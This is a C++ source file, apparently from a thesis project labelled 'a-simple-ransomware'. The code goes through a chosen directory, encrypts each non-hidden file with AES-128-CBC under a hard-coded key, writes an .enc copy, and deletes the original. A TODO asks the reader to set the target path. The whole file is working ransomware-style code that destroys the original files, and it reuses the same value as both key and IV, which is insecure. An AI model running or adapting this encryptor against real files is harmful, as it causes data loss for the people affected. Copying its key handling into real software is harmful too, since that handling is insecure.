#include <iostream>
#include <fstream>
#include <filesystem>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>

namespace fs = std::filesystem;

// KEY = IV = 12345678123456781234567812345678
static const uint8_t KEY[] = { 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78 };
static const uint8_t IV[] = { 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78, 0x12, 0x34, 0x56, 0x78 };

void handleErrors() {
    ERR_print_errors_fp(stderr);
    abort();
}

void encryptFile(const fs::path& inputFilePath, const fs::path& outputFilePath) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) handleErrors();

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, KEY, IV)) {
        handleErrors();
    }

    std::ifstream inFile(inputFilePath, std::ios::binary);
    std::ofstream outFile(outputFilePath, std::ios::binary);

    if (!inFile.is_open() || !outFile.is_open()) {
        std::cerr << "Error opening files!" << std::endl;
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    unsigned char buffer[1024];
    unsigned char ciphertext[1024 + EVP_CIPHER_block_size(EVP_aes_128_cbc())];

    int len;
    int ciphertext_len;
    while (inFile.read(reinterpret_cast<char*>(buffer), sizeof(buffer)) || inFile.gcount() > 0) {
        if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, buffer, inFile.gcount())) {
            handleErrors();
        }
        outFile.write(reinterpret_cast<char*>(ciphertext), len);
    }

    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext, &ciphertext_len)) {
        handleErrors();
    }
    outFile.write(reinterpret_cast<char*>(ciphertext), ciphertext_len);

    inFile.close();
    outFile.close();
    EVP_CIPHER_CTX_free(ctx);
}

void processFilesInDirectory(const fs::path& directoryPath) {
    for (const auto& entry : fs::directory_iterator(directoryPath)) {
        if (entry.is_regular_file() && entry.path().filename().string().find(".") != 0) {
            fs::path inputFilePath = entry.path();
            fs::path encryptedFilePath = inputFilePath;
            encryptedFilePath += ".enc";

            encryptFile(inputFilePath, encryptedFilePath);
            fs::remove(inputFilePath);
        }
    }
}

int main() {
    std::string directoryPath = "./Developer/Tesi/a-simple-ransomware/data"; // TODO: put the path of the directory you want to encrypt
    // std::string directoryPath = "a/valid/path/goes/here"; 
    processFilesInDirectory(directoryPath);
    return 0;
}